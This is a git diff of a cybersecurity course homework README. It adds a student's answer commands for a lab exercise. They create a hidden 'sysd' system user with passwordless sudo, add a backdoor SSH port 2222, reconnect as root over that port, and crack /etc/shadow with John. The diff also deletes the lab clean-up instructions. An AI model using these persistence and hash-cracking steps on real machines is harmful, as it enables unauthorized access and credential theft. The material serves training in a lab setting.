@@ -100,17 +100,37 @@ In this step, you'll create a "secret" user named `sysd`. Anyone examining `/etc
 
 1. Create a `sysd` user.
 
+useradd --no-create-home sysd
+
 2. Give your user a password (make sure you remember it).
 
+ passwd sysd
+
 3. Give your user a system UID (any UID below 1000)
+
+usermod -u 90 sysd
+
 4. Give your user a GID equal to this UID
+
+groupmod -g 90 sysd
+
 5. Give your user full `sudo` access without a password 
+
+usermod -aG sudo sysd
+
+  Edit the sudoers file for user privilege specification; including NOPASSWD:ALL
+
+  sudo visudo 
   
 Minimize exposure by ensuring that your secret user does not have a home folder.
 
 6. Test that your `sysd` user can execute commands with `sudo` access without a password before moving on.
 
     - Try running `sudo -l` to test. If the terminal does not prompt you for a password, it was a success. Attempt any other commands that require elevated privileges and mark them in your Submission File.
+    
+    su sysd
+    
+    sudo -l
 
 **Note**: If a hacker can rapidly execute commands on a machine with elevated privileges, they can more quickly exfiltrate important data from the target machine.
 
@@ -123,6 +143,10 @@ In this step, you'll allow SSH access via port `2222`. SSH usually runs on port 
     - When you open the configuration file, add a secondary SSH port line under port `22`.
 
     - This will require some research. Start by examining `/etc/ssh/sshd_config` and using online searches or man pages to learn more about the available configuration options.
+    
+    nano /etc/ssh/sshd_config
+    
+     Add port 2222 
 
 #### Step 3: Testing Your Configuration Update
 
@@ -130,15 +154,21 @@ When you think you've configured things properly, test your solution by testing 
 
 1. First, note that the IP address of the target machine is `192.168.6.105`. You'll need this for when you attempt to log back into the target machine.
 
-  - Make sure to restart the SSH service.
-
+  service ssh restart
+  
 2. Exit the `root` account, and log off of the target machine (you'll know you're back in your attacker machine when the prompt turns green).
+
+Command: exit
 
 3. Use your attacking machine to test the new backdoor SSH port:
 
     - SSH back into the target machine as your `sysd` user, but this time change the port from `22` to `2222` using: `ssh sysd@192.168.6.105 -p 2222`.
+    
+    ssh sysd@192.168.6.105 -p 2222
 
 4.  Once you are connected to the target machine over SSH, use `sudo su` to switch back to the `root` user.
+
+sudo su 
 
 - **Note**: This is an important step. You were able to log out of your `root` account, and then reestablish a remote session with escalated privileges through a different, un-guarded port.
 
@@ -156,29 +186,13 @@ Having access to all the accounts will also allow us to access the system if our
 
 1. Make sure that you have SSH-ed into the target machine using your `sysd` account.
 
+ssh sysd@192.168.6.105 -p 2222
+
 2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file.
 
-    - You will not need to transfer the file as John is already installed on the scavenger hunt VM.
+sudo su
 
-**Note:** Cracking passwords is a process that takes time. Now might be a good opportunity to take a break and let the computer do the work for you.
-
-### Submission Guidelines
-
-- Please finish filling out the [Submission File](Submission.md) and submit it for homework when complete.
-
-### Lab Clean Up
-
-**Warning:** Only do the following once you have submitted your homework and do not have additional changes to the assignment. 
-
-These steps are optional. Complete them if you want to remove the homework-specific Vagrant lab VMs to free up space on your personal computer.
-
-1. Open the terminal window that you ran `vagrant up` in, or re-open a terminal window at the directory you saved your `Vagrantfile`.
-
-2. Run `vagrant halt` to shut down the Target Machine and Attacker Machine virtual machines.
-
-    - `vagrant` will attempt to gracefully shut down the machines.
-
-3. After that has completed, run the command `vagrant destroy` and confirm removal of both virtual machines by typing `y`/`yes` and pressing Enter.
+john  /etc/shadow
 
 ---
 © 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.
